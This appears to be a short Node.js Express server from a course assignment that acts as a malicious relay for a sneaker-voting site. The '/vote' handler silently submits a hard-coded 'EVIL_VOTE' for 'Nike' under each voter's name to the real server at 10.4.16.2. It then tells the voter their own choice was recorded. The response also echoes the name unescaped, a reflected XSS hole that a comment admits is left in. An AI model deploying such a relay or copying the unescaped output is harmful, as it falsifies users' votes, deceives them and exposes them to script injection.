'use strict';
const express = require('express');
const bodyParser = require("body-parser");
const https = require('https');
const fs = require('fs');
const request = require("request");

const app = express();

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

const EVIL_VOTE = 'Nike';

const file_opt = {
  root: __dirname + '/public/',
  dotfiles: 'deny',
};

app.get('/', (req, res, next) => {
  res.sendFile('index.html', file_opt);
});

app.post('/vote', (req, res) => {
  let vote = req.body.sneaker;
  if (vote === 'writein') vote = req.body.writein;

  let name = req.body.name;
  console.log(`Got a vote from "${name}" for "${vote}"!`);

  // Do evil things
  request({uri: "http://10.4.16.2/vote",
           method: 'POST',
           form: {
             sneaker: EVIL_VOTE,
             writein: "",
             name: name,
           },
          },
          (error, response, body) => console.log(error ? error : body));

  // Yes, this is horrible for XSS reasons. No, I don't care for this assignment
  res.send(`Thank you ${name}, your vote for "${vote}" has been recorded`);
});

// var httpsServer = https.createServer({
//   key: fs.readFileSync('server-key.pem'),
//   cert: fs.readFileSync('server-cert.pem')
// }, app);
// httpsServer.listen(4443);
const server = app.listen(80);
